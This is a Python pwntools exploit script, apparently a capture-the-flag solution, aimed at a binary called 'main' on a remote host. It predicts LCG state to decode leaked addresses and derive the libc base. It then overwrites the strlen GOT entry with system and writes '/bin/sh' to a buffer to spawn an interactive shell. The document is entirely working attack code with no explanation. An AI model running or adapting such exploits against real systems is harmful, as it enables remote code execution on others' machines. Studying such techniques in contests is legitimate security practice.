from Crypto.Util.number import *
from pwn import *
REMOTE = True
elf = ELF('./main')
while True:
    if REMOTE:
        r = remote('100.90.0.178', 30003)
    else: 
        r = process('./main')
    libc = elf.libc
    def get_state() -> list:
        return [int(r.recvline().split(b' : ')[1].replace(b'\n', b'')) for _ in range(4)]

    def get_encrypt_addr() -> list:
        return [int(r.recvline().split(b' : ')[1].replace(b'\n', b''), 16) for _ in range(6)]

    r.sendlineafter('> ', '1')
    r.recvuntil('setting state...\n')
    states = get_state()
    encrypt_addr = get_encrypt_addr()
    print(states)
    try:
        A = (states[1] - states[2]) * inverse((states[0] - states[1]), 2**64) % 2**64
        B = (states[2] - A * states[1]) % 2**64
        print(A, B)
        M = 2**64
        inverse_A = inverse(A, 2**64)
        pie_write = (inverse_A * (encrypt_addr[0] - B)) % 2**64
        libc_write = (inverse_A * (encrypt_addr[2] - B)) % 2**64
        libc_base = libc_write - 0x21a000
        system = libc_base + libc.symbols['system']
        strlen_got = libc_write + 0x98
        name = pie_write + 0x10
        r.success(f'pie write address : {hex(pie_write)}')
        r.success(f'libc write address : {hex(libc_write)}')
        
        r.sendlineafter('> ', '2')
        r.sendlineafter('addr > ', str(strlen_got))
        r.send(p64(system))

        r.sendlineafter('> ', '2')
        r.sendlineafter('addr > ', str(name))
        r.send('/bin/sh\x00')
        r.sendline('3')
        r.interactive()

    except:
        r.close()
        continue
